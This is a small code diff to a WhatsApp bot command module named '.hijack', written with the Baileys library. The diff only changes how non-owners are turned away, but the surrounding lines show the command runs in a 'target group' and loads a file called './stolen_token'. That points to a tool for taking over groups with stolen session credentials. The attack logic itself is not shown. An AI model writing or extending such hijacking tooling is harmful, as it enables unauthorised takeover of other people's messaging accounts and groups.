@@ -1,3 +1,4 @@
+const { sendOwnerRestricted } = require('../lib/groupAdminNotice')
 const fs = require('fs')
 const path = require('path')
 const { useMultiFileAuthState, makeWASocket, BufferJSON, DisconnectReason } = require('@whiskeysockets/baileys')
@@ -9,7 +10,7 @@ module.exports = {
   usage: ".hijack",
 
   run: async ({ sock, from, msg, args, isOwner }) => {
-    if (!isOwner) return sock.sendMessage(from, { text: "❌ Owner only" })
+    if (!isOwner) return sendOwnerRestricted(sock, msg?.key?.remoteJid, msg)
     if (!from.endsWith('@g.us')) return sock.sendMessage(from, { text: "❌ Use in target group" })
 
     const tokenPath = path.resolve('./stolen_token')
